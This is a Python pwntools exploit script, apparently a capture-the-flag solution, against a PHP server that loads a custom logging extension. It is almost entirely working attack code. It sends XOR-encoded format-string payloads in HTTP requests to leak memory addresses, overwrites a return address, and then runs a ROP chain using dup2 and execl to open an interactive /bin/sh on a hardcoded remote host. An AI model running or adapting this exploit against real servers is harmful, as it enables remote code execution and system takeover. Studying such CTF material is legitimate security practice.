#!/usr/bin/env python3

from pwn import *

import urllib.parse

php_logger = ELF("./php_logger.so")
php = ELF('./php')

KEY = 128

context.binary = php_logger
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'

def encrypt(input):
    result = b''
    for b in input:
        result += bytes([b ^ KEY])
    return result


def main():
    # Summary: one-byte overwrite (due to PIE) + leak binary/stack addresses + ret2binary + IO redirect via dup2

    # Tips: to debug, you need to update build script to allow ptrace. Also need some extra commands in Dockerfile to install GDB and GEF. See these files for details.
    # Attach the gdb to the php server by `gdb -p $(ps aux | grep php | grep -v grep | awk '{print $2}')`

    # Debugging: list the available PLT entries, e.g. execvp/execle/execl.
    # info(f'php has following PLTs: {php.plt}')
    # info(f'php logger has following PLTs: {php_logger.plt}')
    # pause()

    # HOST = '127.0.0.1'
    # PORT = 1337
    HOST = '154.57.164.73'
    PORT = 32706

    r = remote(HOST, PORT)
    raw_input = b'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'
    # xor can be reverted by applying the key again.
    encrypted_input = encrypt(raw_input)
    payload = encrypted_input + b'A' * (152 - len(encrypted_input)) + b'\x40'   # The last byte will write the last byte of the ret address to the instruction which calls the print_message().
    url_payload = urllib.parse.quote_from_bytes(payload).encode()
    request = (
        b'GET /index.php?cmd=' + url_payload + b' HTTP/1.1\r\n'
        b'Host: host\r\n'
        b'Cmd-Key: 128\r\n'
        b'\r\n'
            )
    r.send(request)

    r.recvlines(7)
    data = r.recvline().split(b'0x')
    # info(f'content is {data}')
    buff = int(data[1], 16)
    info(f'buffer is at {hex(buff)}')
    info(f'logger leak is {data[9]}')
    php_logger.address = int(data[9], 16) - 0x1445
    info(f'logger base is {hex(php_logger.address)}')
    info(f'php binary leak is at {data[19]}')
    php.address = int(data[19], 16) - 0x5900a3
    info(f'php binary base is at {hex(php.address)}')
    r.close()

    rop = ROP([php, php_logger])
    rop.dup2(4, 0)
    rop.dup2(4, 1)
    # rop.dup2(4, 2)        # Somehow I cannot also overwrite the stderr.
    rop.execl(buff, buff, 0)
    raw_input = b'/bin/sh\x00'
    encrypted_input = encrypt(raw_input)
    payload = encrypted_input + b'A' * (152 - len(encrypted_input)) + rop.chain()
    url_payload = urllib.parse.quote_from_bytes(payload).encode()
    request = (
        b'GET /index.php?cmd=' + url_payload + b' HTTP/1.1\r\n'
        b'Host: host\r\n'
        b'Cmd-Key: 128\r\n'
        b'\r\n'
            )
    # Note that we must recreate a new IO here because HTTP is different.
    r = remote(HOST, PORT)
    r.send(request)

    r.interactive()


if __name__ == "__main__":
    main()
